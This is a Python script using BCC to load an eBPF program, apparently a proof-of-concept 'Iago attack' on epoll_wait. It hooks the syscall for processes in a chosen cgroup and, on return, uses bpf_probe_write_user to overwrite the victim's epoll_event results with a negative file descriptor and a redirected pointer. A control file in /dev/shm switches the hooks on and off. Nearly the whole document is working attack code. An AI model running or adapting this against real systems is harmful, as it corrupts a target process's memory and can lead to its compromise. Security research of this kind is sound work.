import os
import sys
import time
from bcc import BPF

if len(sys.argv) != 2:
    print("Usage: python3 script.py <target_cgroup_id>")
    sys.exit(1)

target_cgroup_id = int(sys.argv[1])

bpf_program = f"""
#include <linux/bpf.h>
#include <uapi/linux/ptrace.h>
#include <linux/ptrace.h>
#include <linux/sched.h>

struct addrs_y {{
    void *event_0_fd;
    void *event_1_ptr;
    void *event_2;
    void *event_2_fd;
}};

struct epoll_event {{
    uint32_t events;  /* Epoll events */
    union {{
        void        *ptr;
        int          fd;
        uint32_t     u32;
        uint64_t     u64;
    }} data;
}};
struct data_t {{
    char comm[TASK_COMM_LEN];
}};

BPF_HASH(addrs_poc, u32, struct addrs_y);

static inline bool compare_cgroup_id(u64 cgroup_id) {{
    u64 current_cgroup_id = bpf_get_current_cgroup_id();
    if (cgroup_id != current_cgroup_id)
        return false;

    return true;
}}

int syscall__trace_entry_epoll_wait(struct pt_regs *ctx, int epfd, struct epoll_event __user * events)
{{
    char *target_comm = "test";
    char comm[TASK_COMM_LEN];
    struct addrs_y addrs = {{}};
    u32 key = 0;
    int new_fd = -14;

    u64 target_cgroup = {target_cgroup_id};
    if (!compare_cgroup_id(target_cgroup))
        return 0;

    addrs.event_0_fd = &events[0].data.fd;
    addrs.event_0_fd = addrs.event_0_fd - 4;
    addrs.event_1_ptr = &events[1].data.ptr;
    addrs.event_1_ptr = addrs.event_1_ptr -8;
    addrs.event_2 = &events[2];
    addrs.event_2 = addrs.event_2 - 8;
    addrs.event_2_fd = &events[2].data.fd;
    addrs_poc.update(&key, &addrs);

    return 0;
}};


int syscall__trace_exit_epoll_wait(struct pt_regs *ctx, int epfd, struct epoll_event __user * events)
{{
    char *target_comm = "test";
    char comm[TASK_COMM_LEN];
    int new_fd = -14;
    int new_fd_2 = -14;
    u64 dst_2;

    u64 target_cgroup = {target_cgroup_id};
    if (!compare_cgroup_id(target_cgroup))
        return 0;
    
    u32 key = 0;
    struct addrs_y *dst_poc = addrs_poc.lookup(&key);
    if (!dst_poc)
        return 0;
    // write -14 to event_0_fd, making &fdarray[-14] = &epoll_events[1].data.ptr
    u64 success =  bpf_probe_write_user(dst_poc->event_0_fd, &new_fd, sizeof(new_fd));
    bpf_trace_printk("success = %d", success);

    // epoll_events[1].data.ptr =  &epoll_events[2]
    dst_2 = (u64)dst_poc->event_2;
    success =  bpf_probe_write_user(dst_poc->event_1_ptr, &dst_2, sizeof(dst_2));
    bpf_trace_printk("success = %d", success);

    // epoll_events[2] = -14, which makes ev->fdarray[-14]->fd = epoll_events[2] = -14
    success =  bpf_probe_write_user(dst_poc->event_2, &new_fd_2, sizeof(new_fd_2));
    bpf_trace_printk("success = %d", success);  
    bpf_trace_printk("dst_poc->event_2 = %u", dst_poc->event_2);   

    return 0;
}};
"""

bpf = BPF(text=bpf_program)

switch_file = "/dev/shm/switch_file"

if not os.path.exists(switch_file):
    with open(switch_file, "w") as f:
        f.write("")

print("eBPF program loaded. Monitoring /dev/shm/switch_file for commands...")

try:
    attached = False  

    while True:
        with open(switch_file, "r") as f:
            content = f.read().strip()

        if content == "iago_attack_epoll_wait" and not attached:
            print("Attaching kretprobe to read...")
            bpf.attach_kprobe(event = (bpf.get_syscall_prefix().decode() + 'epoll_wait'), fn_name = "syscall__trace_entry_epoll_wait")
            bpf.attach_kretprobe(event = (bpf.get_syscall_prefix().decode() + 'epoll_wait'), fn_name = "syscall__trace_exit_epoll_wait")
            attached = True

        elif content != "iago_attack_epoll_wait" and attached:
            print("Detaching kretprobe from read...")
            bpf.detach_kprobe(event = (bpf.get_syscall_prefix().decode() + 'epoll_wait'), fn_name = "syscall__trace_entry_epoll_wait")
            bpf.detach_kretprobe(event = (bpf.get_syscall_prefix().decode() + 'epoll_wait'), fn_name = "syscall__trace_exit_epoll_wait")
            attached = False


        time.sleep(1)
except KeyboardInterrupt:
    if attached:
        bpf.detach_kprobe(event = (bpf.get_syscall_prefix().decode() + 'epoll_wait'), fn_name = "syscall__trace_entry_epoll_wait")
        bpf.detach_kretprobe(event = (bpf.get_syscall_prefix().decode() + 'epoll_wait'), fn_name = "syscall__trace_exit_epoll_wait")
    print("Detaching probes and exiting...")
